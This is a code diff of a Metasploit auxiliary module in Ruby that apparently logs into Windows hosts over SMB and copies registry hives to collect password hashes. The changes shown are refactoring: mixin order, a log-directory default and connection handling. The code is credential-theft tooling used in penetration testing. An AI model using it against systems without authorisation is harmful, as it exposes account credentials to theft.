@@ -1,23 +1,17 @@
 #!/usr/bin/env ruby
 
 require 'msf/core'
-require 'rex'
 require 'rex/registry'
 require 'fileutils'
 
 class Metasploit3 < Msf::Auxiliary
 
 	# Exploit mixins should be called first
+	include Msf::Exploit::Remote::DCERPC
 	include Msf::Exploit::Remote::SMB
 	include Msf::Exploit::Remote::SMB::Authenticated
 	include Msf::Auxiliary::Report
 	include Msf::Auxiliary::Scanner
-	include Msf::Exploit::Remote::DCERPC
-
-	# Aliases for common classes
-	SIMPLE = Rex::Proto::SMB::SimpleClient
-	XCEPT  = Rex::Proto::SMB::Exceptions
-	CONST  = Rex::Proto::SMB::Constants
 
 	def initialize
 		super(
@@ -39,12 +33,11 @@ class Metasploit3 < Msf::Auxiliary
 
 		register_options([
 			OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
-			OptString.new('LOGDIR', [true, 'This is a directory on your local attacking system used to store Hive files and hashes', '/tmp/msfhashes']),
+			OptString.new('LOGDIR', [true, 'This is a directory on your local attacking system used to store Hive files and hashes', '/tmp/msfhashes/local']),
 			OptString.new('RPORT', [true, 'The Target port', 445]),
 		], self.class)
 
 		deregister_options('RHOST')
-		datastore['LOGDIR'] += "#{Time.new.strftime("%Y-%m-%d-%H%M%S")}"
 	end
 
 
@@ -53,14 +46,12 @@ class Metasploit3 < Msf::Auxiliary
 	def run_host(ip)
 		sampath = "#{Rex::Text.rand_text_alpha(20)}"
 		syspath = "#{Rex::Text.rand_text_alpha(20)}"
-		#logdir = "#{datastore['LOGDIR']}/#{Time.now.strftime("%Y-%m-%d-%H%M%S")}"
 		logdir = datastore['LOGDIR']
-		#::FileUtils.mkdir_p(logdir) unless ::File.exists?(logdir)
 		hives = [sampath, syspath]
 		smbshare = datastore['SMBSHARE']
 
+		connect()
 		begin
-			connect()
 			smb_login()
 		rescue StandardError => autherror
 			print_error("#{ip} - #{autherror}")
